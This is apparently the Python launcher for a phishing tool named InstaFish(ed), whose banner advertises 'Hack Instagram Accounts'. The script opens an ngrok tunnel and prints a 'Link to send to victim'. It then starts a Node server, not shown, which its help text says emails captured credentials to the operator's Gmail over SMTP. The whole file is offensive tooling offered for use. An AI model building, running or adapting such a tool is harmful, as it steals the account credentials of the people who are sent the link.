from cgi import print_form
import subprocess
import os
from colorama import Fore
from pyngrok import ngrok
import argparse


color = input("Which Color You Want Your Terminal To Be [RED(0),ORANGE(1),BLUE(2)]")
if (color == "0" or color == "1" or color == "2"):
    print(color)
    if color == "0":
                    print(Fore.LIGHTRED_EX + """
 (_____ \(_______|____ \ (_______) ___ \ \  / (_____|_______)     
  _____) )_____   _   \ \ _____ | |   | \ \/ /   _   _____        
 (_____ (|  ___) | |   | |  ___)| |   | |)  (   | | |  ___)       
       | | |_____| |__/ /| |    | |___| / /\ \ _| |_| |_____      
       |_|_______)_____/ |_|     \_____/_/  \_(_____)_______)     
                                                                                                                         
 _______ _______ _______ _______ _______ _______ _______ _______ 
(_______|_______|_______|_______|_______|_______|_______|_______)

 ╦ ╦┌─┐┌─┐┬┌─  ╦┌┐┌┌─┐┌┬┐┌─┐┌─┐┬─┐┌─┐┌┬┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌┐┌┌┬┐┌─┐
 ╠═╣├─┤│  ├┴┐  ║│││└─┐ │ ├─┤│ ┬├┬┘├─┤│││  ╠═╣│  │  │ ││ ││││ │ └─┐
 ╩ ╩┴ ┴└─┘┴ ┴  ╩┘└┘└─┘ ┴ ┴ ┴└─┘┴└─┴ ┴┴ ┴  ╩ ╩└─┘└─┘└─┘└─┘┘└┘ ┴ └─┘

 GITHUB: https://github.com/zTheDeer                                                        
""")  
    elif color == "1":
            print(Fore.LIGHTYELLOW_EX + """
 (_____ \(_______|____ \ (_______) ___ \ \  / (_____|_______)     
  _____) )_____   _   \ \ _____ | |   | \ \/ /   _   _____        
 (_____ (|  ___) | |   | |  ___)| |   | |)  (   | | |  ___)       
       | | |_____| |__/ /| |    | |___| / /\ \ _| |_| |_____      
       |_|_______)_____/ |_|     \_____/_/  \_(_____)_______)     
                                                                                                                         
 _______ _______ _______ _______ _______ _______ _______ _______ 
(_______|_______|_______|_______|_______|_______|_______|_______)

 ╦ ╦┌─┐┌─┐┬┌─  ╦┌┐┌┌─┐┌┬┐┌─┐┌─┐┬─┐┌─┐┌┬┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌┐┌┌┬┐┌─┐
 ╠═╣├─┤│  ├┴┐  ║│││└─┐ │ ├─┤│ ┬├┬┘├─┤│││  ╠═╣│  │  │ ││ ││││ │ └─┐
 ╩ ╩┴ ┴└─┘┴ ┴  ╩┘└┘└─┘ ┴ ┴ ┴└─┘┴└─┴ ┴┴ ┴  ╩ ╩└─┘└─┘└─┘└─┘┘└┘ ┴ └─┘

 GITHUB: https://github.com/zTheDeer                                                        
""")  
    elif color == "2":
 
	    print(Fore.LIGHTCYAN_EX + """
	 (_____ \(_______|____ \ (_______) ___ \ \  / (_____|_______)     
	  _____) )_____   _   \ \ _____ | |   | \ \/ /   _   _____        
	 (_____ (|  ___) | |   | |  ___)| |   | |)  (   | | |  ___)       
	       | | |_____| |__/ /| |    | |___| / /\ \ _| |_| |_____      
	       |_|_______)_____/ |_|     \_____/_/  \_(_____)_______)     
		                                                                                                                 
	 _______ _______ _______ _______ _______ _______ _______ _______ 
	(_______|_______|_______|_______|_______|_______|_______|_______)

	 ╦ ╦┌─┐┌─┐┬┌─  ╦┌┐┌┌─┐┌┬┐┌─┐┌─┐┬─┐┌─┐┌┬┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌┐┌┌┬┐┌─┐
	 ╠═╣├─┤│  ├┴┐  ║│││└─┐ │ ├─┤│ ┬├┬┘├─┤│││  ╠═╣│  │  │ ││ ││││ │ └─┐
	 ╩ ╩┴ ┴└─┘┴ ┴  ╩┘└┘└─┘ ┴ ┴ ┴└─┘┴└─┴ ┴┴ ┴  ╩ ╩└─┘└─┘└─┘└─┘┘└┘ ┴ └─┘

	 GITHUB: https://github.com/zTheDeer                                                        
	""")    
	    
else:
    print("Default Color is White\n\n")
    print(Fore.WHITE + """
 (_____ \(_______|____ \ (_______) ___ \ \  / (_____|_______)     
  _____) )_____   _   \ \ _____ | |   | \ \/ /   _   _____        
 (_____ (|  ___) | |   | |  ___)| |   | |)  (   | | |  ___)       
       | | |_____| |__/ /| |    | |___| / /\ \ _| |_| |_____      
       |_|_______)_____/ |_|     \_____/_/  \_(_____)_______)     
                                                                                                                         
 _______ _______ _______ _______ _______ _______ _______ _______ 
(_______|_______|_______|_______|_______|_______|_______|_______)

 ╦ ╦┌─┐┌─┐┬┌─  ╦┌┐┌┌─┐┌┬┐┌─┐┌─┐┬─┐┌─┐┌┬┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌┐┌┌┬┐┌─┐
 ╠═╣├─┤│  ├┴┐  ║│││└─┐ │ ├─┤│ ┬├┬┘├─┤│││  ╠═╣│  │  │ ││ ││││ │ └─┐
 ╩ ╩┴ ┴└─┘┴ ┴  ╩┘└┘└─┘ ┴ ┴ ┴└─┘┴└─┴ ┴┴ ┴  ╩ ╩└─┘└─┘└─┘└─┘┘└┘ ┴ └─┘

 GITHUB: https://github.com/zTheDeer                                                        
""") 
    
class InstaFish:
    def __init__(self,port,email,password):
        self.port = port
        self.email = email
        self.password = password
    def connect(self):
        control = subprocess.getoutput("node -v")
        if control[0] == "v":
            print(f"NodeJS version {control} found, Processing... \n\n")
            try:
                ssh_tunnel = ngrok.connect(port, "tcp")
                last_list = str(ssh_tunnel).split('"')
                ip = last_list[1]
                print("Link to send to victim: " + ip)
            except Exception as e:
                print(str(e))
                print("\n\nAn Error Occurred")
                print("Sarcasticly you have to authenticate your ngrok or gotta install it first. To do this, please visit ngrok's official site: https://ngrok.com/")
                print("See ya!\n")
        else:
            print("Oppss! We're using NodeJS to launch the server, please download the NodeJS first to proceed")
            print("https://nodejs.org/en/download/")
            
    def launchServer(self,port,mail,password):
        os.system(f'node node/main.js add --mail={mail} --password={password} --port={port} ')




parser = argparse.ArgumentParser(description='We need a port, a gmail to send the credentials and the password for the gmail to use the smtp...\n Example Usage: python3 InstaFished.py --port </PORT> --mail </EMAIL> --password </PASSWORD>')
parser.add_argument('--port', action='store', type=str, help='Port to forward and use it as a server')
parser.add_argument('--mail', action='store', type=str, help='Your personal gmail address')
parser.add_argument('--password', action='store', type=str, help='Since the google not letting us to use your own passwords in 3rd party softwares, you have to create an app key from https://myaccount.google.com/security?hl=tr ')

args = parser.parse_args()
port = (args.port)
mail = (args.mail)
password = (args.password)

InstaFishClient = InstaFish(int(port),mail,password)
InstaFishClient.connect()
InstaFishClient.launchServer(int(port),mail,password)